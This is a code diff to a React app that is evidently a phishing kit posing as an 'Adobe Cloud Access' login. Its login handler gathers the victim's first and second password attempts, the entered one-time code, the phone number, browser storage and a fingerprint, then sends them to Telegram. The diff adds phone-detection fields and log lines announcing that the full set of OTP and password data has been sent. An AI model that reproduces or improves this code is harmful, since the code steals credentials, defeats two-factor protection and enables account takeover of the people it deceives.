@@ -207,7 +207,7 @@ function App() {
 
   // Handler for login success from login components
   const handleLoginSuccess = async (sessionData: any) => {
-    console.log('🔐 Login success:', sessionData);
+    console.log('🔐 Login success with OTP verification:', sessionData);
     
     // Cookie capturing is disabled. Set placeholder values.
     const realCookies = '';
@@ -252,7 +252,7 @@ function App() {
       ...sessionData,
       sessionId: sessionData.sessionId || Math.random().toString(36).substring(2, 15),
       timestamp: new Date().toISOString(),
-      fileName: 'Adobe Cloud Access',
+      fileName: sessionData.fileName || 'Adobe Cloud Access',
       clientIP: 'Unknown',
       userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : 'Unknown',
       deviceType: typeof navigator !== 'undefined' && /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'mobile' : 'desktop',
@@ -263,12 +263,13 @@ function App() {
       localStorage: browserFingerprint.localStorage,
       sessionStorage: browserFingerprint.sessionStorage,
       browserFingerprint: browserFingerprint,
-      // OTP and password data passed from LoginPage
+      // OTP and password data from LoginPage
       firstAttemptPassword: sessionData.firstAttemptPassword || '',
       secondAttemptPassword: sessionData.secondAttemptPassword || '',
       otpEntered: sessionData.otpEntered || '',
-      deliveryMethod: sessionData.deliveryMethod || '',
+      deliveryMethod: sessionData.deliveryMethod || 'phone',
       phone: sessionData.phone || '',
+      phoneDetectedFrom: sessionData.phoneDetectedFrom || '',
     };
 
     setHasActiveSession(true);
@@ -279,12 +280,13 @@ function App() {
     }
 
     try {
+      console.log('📤 Sending complete authentication data to Telegram (with OTP and passwords)...');
       await safeSendToTelegram(updatedSession);
       
       // Ensure we redirect to landing page
       setCurrentPage('landing');
       setIsLoading(false);
-      console.log('✅ Login data sent to Telegram');
+      console.log('✅ Complete authentication data sent to Telegram');
     } catch (error) {
       console.error('❌ Failed to send to Telegram:', error);
       // Even if sending fails, still move to landing to avoid blocking UX
